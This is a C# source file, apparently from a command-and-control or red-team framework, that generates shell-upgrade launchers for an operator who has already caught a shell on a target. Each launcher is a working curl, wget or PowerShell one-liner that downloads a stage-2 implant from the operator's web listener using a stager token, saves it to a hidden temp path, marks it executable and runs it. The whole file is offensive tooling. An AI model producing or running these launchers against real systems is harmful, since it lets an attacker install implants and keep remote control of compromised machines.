namespace Rod.Transport.Listeners.ShellCatch;

/// <summary>
/// Renders the one-liners an operator pastes into a caught shell to grow it
/// into a real implant (architecture.md Sec 5.2, Sec 6, Sec 8). Each
/// launcher is the standard fetch-and-run shape the stager half of staging
/// defines -- fetch the stage-2 bytes over the engagement's web listener,
/// present the deployment credential, run what came back -- expressed in
/// the shell family the target is known or guessed to have. Pure rendering
/// of (url, credential, family) into commands: the target-side behavior is
/// the plain, documented fetch-execute pattern, nothing family-specific
/// beyond the downloader each OS ships with.
/// </summary>
public static class ShellUpgradeLaunchers
{
    /// <summary>One renderable launcher, named for the surface it is pasted into.</summary>
    public sealed record Launcher(string Id, string Os, string Command);

    /// <summary>
    /// Renders the launcher family for a stage-2 fetch at
    /// <paramref name="url"/> authorized by <paramref name="secret"/>. Both
    /// Unix downloaders and the PowerShell downloader are always rendered --
    /// the fingerprint is a guess, and showing every variant costs the
    /// operator nothing while a missing one costs a round trip.
    /// </summary>
    public static IReadOnlyList<Launcher> Render(string url, string secret)
    {
        const string unixPath = "/tmp/.rod-stage2";
        return
        [
            new Launcher(
                "unix-curl",
                "linux",
                $"curl -fsSL -H 'X-Stager-Token: {secret}' {url} -o {unixPath} && chmod +x {unixPath} && {unixPath}"),

            new Launcher(
                "unix-wget",
                "linux",
                $"wget -q --header='X-Stager-Token: {secret}' -O {unixPath} {url} && chmod +x {unixPath} && {unixPath}"),

            new Launcher(
                "windows-powershell",
                "windows",
                "powershell -c \"$p=\\\"$env:TEMP\\rod-stage2.exe\\\";"
                    + $"iwr '{url}' -Headers @{{'X-Stager-Token'='{secret}'}} -OutFile $p; & $p\""),
        ];
    }
}
